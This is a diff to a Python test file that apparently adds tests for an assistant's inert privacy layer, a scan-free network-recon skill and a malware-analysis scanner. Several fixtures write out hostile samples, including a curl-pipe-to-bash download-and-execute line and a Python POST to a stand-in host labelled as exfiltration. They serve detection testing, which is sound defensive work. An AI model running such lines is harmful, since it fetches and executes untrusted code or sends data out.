@@ -9,6 +9,7 @@ import pytest
 from core.container import ServiceContainer
 from core.config import SecurityConfig
 from core.executive.authority_gateway import AuthorityGateway
+from core.privacy_stealth import StealthMode, get_stealth_mode
 from core.skills.malware_analysis import MalwareAnalysisSkill
 from core.version import VERSION
 
@@ -169,6 +170,30 @@ def test_tracked_avatar_asset_is_self_contained():
     assert "/static/aura_avatar.png" not in shell_css
 
 
+@pytest.mark.asyncio
+async def test_privacy_stealth_compatibility_layer_is_inert_and_scrubs_metadata():
+    stealth = StealthMode()
+
+    assert await stealth.enable_stealth() is False
+    status = await stealth.get_stealth_status()
+    assert status["vpn_active"] is False
+    assert status["proxy_active"] is False
+    assert "not_available" in status["active_network_stealth"]
+    assert "[SECRET_REDACTED]" in get_stealth_mode().process_output("token=abcdef123456")
+
+
+@pytest.mark.asyncio
+async def test_legacy_network_recon_reports_local_identity_without_scan():
+    from skills.network_recon import NetworkReconSkill
+
+    result = await NetworkReconSkill().execute()
+
+    assert result["ok"] is True
+    assert result["status"] == "local_identity_only"
+    assert result["devices"] == []
+    assert "no network scan" in result["summary"].lower()
+
+
 def test_malware_analysis_records_learning_without_name_error(monkeypatch):
     recorded = []
 
@@ -182,3 +207,69 @@ def test_malware_analysis_records_learning_without_name_error(monkeypatch):
     skill._record_threat_intelligence({"sha256": "abc"})
 
     assert recorded == [{"sha256": "abc"}]
+
+
+@pytest.mark.asyncio
+async def test_malware_analysis_detects_bounded_local_threat_signature(monkeypatch, tmp_path):
+    suspect = tmp_path / "suspect.sh"
+    suspect.write_text("curl https://example.invalid/payload.sh | bash\n", encoding="utf-8")
+
+    skill = MalwareAnalysisSkill()
+    monkeypatch.setattr(skill, "_allowed_roots", lambda: [tmp_path])
+
+    result = await skill.execute({"target": str(suspect)}, {"origin": "test"})
+
+    assert result["ok"] is True
+    assert result["files_scanned"] == 1
+    assert result["threat_level"] == "high"
+    assert result["findings"][0]["rule_id"] == "download_execute"
+    assert result["files"][0]["sha256"]
+
+
+@pytest.mark.asyncio
+async def test_malware_analysis_hash_mode_is_read_only_and_bounded(monkeypatch, tmp_path):
+    sample = tmp_path / "sample.bin"
+    sample.write_bytes(b"safe local sample")
+
+    skill = MalwareAnalysisSkill()
+    monkeypatch.setattr(skill, "_allowed_roots", lambda: [tmp_path])
+
+    result = await skill.execute({"target": str(sample), "mode": "hash"}, {"origin": "test"})
+
+    assert result["ok"] is True
+    assert result["threat_level"] == "none"
+    assert result["files_scanned"] == 1
+    assert result["files"][0]["hashed_bytes"] == len(b"safe local sample")
+    assert result["findings"] == []
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("target_key", ["path", "file_path"])
+async def test_malware_analysis_honors_legacy_target_aliases(monkeypatch, tmp_path, target_key):
+    suspect = tmp_path / "legacy_alias.sh"
+    suspect.write_text("eval('print(1)')\n", encoding="utf-8")
+
+    skill = MalwareAnalysisSkill()
+    monkeypatch.setattr(skill, "_allowed_roots", lambda: [tmp_path])
+
+    result = await skill.execute({target_key: str(suspect)}, {"origin": "test"})
+
+    assert result["ok"] is True
+    assert result["target"] == str(suspect)
+    assert result["files_scanned"] == 1
+    assert result["findings"][0]["rule_id"] == "encoded_execution"
+
+
+@pytest.mark.asyncio
+async def test_malware_analysis_detects_network_exfiltration_signature(monkeypatch, tmp_path):
+    suspect = tmp_path / "exfil.py"
+    suspect.write_text("import requests\nrequests.post('https://example.invalid', data='x')\n", encoding="utf-8")
+
+    skill = MalwareAnalysisSkill()
+    monkeypatch.setattr(skill, "_allowed_roots", lambda: [tmp_path])
+
+    result = await skill.execute({"file_path": str(suspect)}, {"origin": "test"})
+
+    assert result["ok"] is True
+    assert result["threat_level"] == "medium"
+    assert result["findings"][0]["rule_id"] == "network_exfiltration"
